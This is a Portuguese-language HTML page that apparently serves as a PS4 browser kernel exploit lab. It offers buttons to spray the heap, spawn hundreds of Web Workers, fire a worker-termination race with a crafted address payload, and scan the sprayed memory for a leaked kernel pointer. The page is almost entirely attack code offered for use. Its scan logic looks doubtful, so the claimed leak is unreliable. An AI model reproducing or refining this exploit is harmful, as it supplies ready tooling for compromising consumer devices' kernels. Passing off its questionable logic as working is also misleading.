<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 EXPLOIT LAB</title>
    <style>
        body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
        h1 { margin: 10px 0; font-size: 18px; color: #0ff; }
        
        .panel { border: 1px solid #444; background: #222; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
        
        label { display: block; font-size: 14px; color: #aaa; margin-bottom: 5px; }
        input { background: #000; color: #fff; border: 1px solid #666; padding: 5px; width: 80px; text-align: center; font-size: 16px; }
        
        button {
            width: 100%; padding: 15px; margin-top: 5px;
            font-size: 16px; font-weight: bold; cursor: pointer;
            background: #333; color: #fff; border: 2px solid #555;
        }
        button:enabled:active { background: #555; }
        button:disabled { opacity: 0.4; }
        
        .btn-spray { border-color: #00f; color: #aaf; }
        .btn-threads { border-color: #fa0; color: #fe0; }
        .btn-attack { border-color: #f00; color: #f88; }
        .btn-scan { border-color: #0f0; color: #8f8; }

        #log { 
            font-family: monospace; background: #000; color: #0f0; 
            height: 120px; overflow-y: scroll; text-align: left; 
            padding: 5px; font-size: 12px; border: 1px solid #333;
        }
        
        #result { display: none; background: #050; padding: 10px; font-size: 20px; font-weight: bold; border: 2px solid #0f0; margin-top: 10px; word-break: break-all; }
    </style>
</head>
<body>

    <h1>PS4 KERNEL LAB (MANUAL)</h1>

    <div class="panel">
        <div style="display:flex; justify-content: space-around;">
            <div>
                <label>Spray (Blocos 64KB)</label>
                <input type="number" id="inp-spray" value="50">
            </div>
            <div>
                <label>Alvo Threads</label>
                <input type="number" id="inp-threads" value="415">
            </div>
        </div>
    </div>

    <div class="panel">
        <button id="btn1" class="btn-spray" onclick="doSpray()">1. ALOCAR MEMÓRIA</button>
        <button id="btn2" class="btn-threads" onclick="createThreads()" disabled>2. CRIAR THREADS</button>
        <button id="btn3" class="btn-attack" onclick="doAttack()" disabled>3. ATACAR (3s)</button>
        <button id="btn4" class="btn-scan" onclick="doScan()" disabled>4. ESCANEAR</button>
        <button onclick="location.reload()" style="margin-top:10px; background:#400;">REINICIAR TUDO (F5)</button>
    </div>

    <div id="result"></div>
    <div id="log">Console pronto. Ajuste os valores acima.</div>

    <script>
        // CONFIGURAÇÃO FIXA
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x01; // Endereço 0x01... (Baixo)

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `> ${msg}<br>`;
            el.scrollTop = el.scrollHeight;
        }

        // 1. SPRAY MANUAL
        function doSpray() {
            const count = parseInt(document.getElementById('inp-spray').value);
            log(`Tentando alocar ${count} blocos...`);
            
            try {
                // Prepara padrão (RET + Shellcode placeholders)
                // Usando Uint32Array puro para economizar RAM máxima
                for(let i=0; i<count; i++) {
                    let arr = new Uint32Array(0x4000); // 64KB cada
                    arr.fill(0xC3C3C3C3); // Enche rápido
                    
                    // Marcação para scan (Pattern)
                    // Coloca "buracos" onde o kernel pode escrever ou onde leríamos
                    for(let k=0; k < arr.length; k+=64) {
                        arr[k]   = 0x41414141; // Marca visual
                        arr[k+1] = 0x42424242; 
                        arr[k+4] = 0x00000000; // Slot Leak Low
                        arr[k+5] = 0x00000000; // Slot Leak High
                    }
                    heapSpray.push(arr);
                }
                
                log(`SUCESSO: ${count} blocos alocados.`);
                log(`Total Arrays: ${heapSpray.length}`);
                
                document.getElementById('btn1').disabled = true;
                document.getElementById('btn2').disabled = false;
                
            } catch(e) {
                log("ERRO OOM! Diminua o valor do Spray.");
                // Limpa para tentar de novo
                heapSpray = [];
            }
        }

        // 2. THREADS MANUAL
        function createThreads() {
            const target = parseInt(document.getElementById('inp-threads').value);
            log(`Criando ${target} threads...`);
            document.getElementById('btn2').disabled = true;
            
            let i = setInterval(() => {
                if (workers.length < target) {
                    try {
                        workers.push(new Worker(url));
                    } catch(e) {
                        log("Erro ao criar worker (Limite atingido?)");
                        clearInterval(i);
                    }
                    if(workers.length % 50 === 0) log(`Workers: ${workers.length}...`);
                } else {
                    clearInterval(i);
                    log(`Threads prontas (${workers.length}).`);
                    document.getElementById('btn3').disabled = false;
                }
            }, 30);
        }

        // 3. ATAQUE
        function doAttack() {
            log("Disparando ataque...");
            document.getElementById('btn3').disabled = true;
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            // Aponta para 0x01...
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3;

            const atk = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
            }, 10);

            // Para e limpa após 3s
            setTimeout(() => {
                clearInterval(atk);
                log("Ataque finalizado. Limpando memória...");
                
                // MATA TUDO PARA O SCANNER RODAR LISO
                workers.forEach(w => w.terminate());
                workers = [];
                
                document.getElementById('btn4').disabled = false;
                log("Pode escanear agora.");
            }, 3000);
        }

        // 4. SCANNER
        function doScan() {
            log("Iniciando varredura...");
            document.getElementById('btn4').disabled = true;
            
            let found = false;
            
            // Varre o spray
            for(let i=0; i<heapSpray.length; i++) {
                const arr = heapSpray[i];
                for(let k=0; k<arr.length; k+=64) {
                    // Offset 4 e 5 são onde esperamos o leak
                    let idx = k + 4;
                    if(idx+1 < arr.length) {
                        let valLow = arr[idx];
                        let valHigh = arr[idx+1];
                        
                        // Se não for zero e não for nossa marcação inicial
                        if ((valLow !== 0 || valHigh !== 0) && valLow !== 0x00000000) {
                             // Check básico de kernel pointer (High bytes != 0)
                             if(valHigh !== 0) {
                                 report(valLow, valHigh);
                                 found = true;
                                 break;
                             }
                        }
                    }
                }
                if(found) break;
            }
            
            if(!found) {
                log("Nada encontrado.");
                log("Dica: Aumente o Spray ou tente de novo.");
                // Reabilita botões para nova tentativa (parcial)
                document.getElementById('btn1').disabled = false; 
                document.getElementById('btn1').innerText = "1. ALOCAR MAIS (+)";
            }
        }

        function report(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            const res = document.getElementById('result');
            res.style.display = 'block';
            res.innerText = `LEAK: ${addr}`;
            log("SUCESSO! ANOTE O NÚMERO.");
            localStorage.setItem('ps4_leak', addr);
        }

    </script>
</body>
</html>
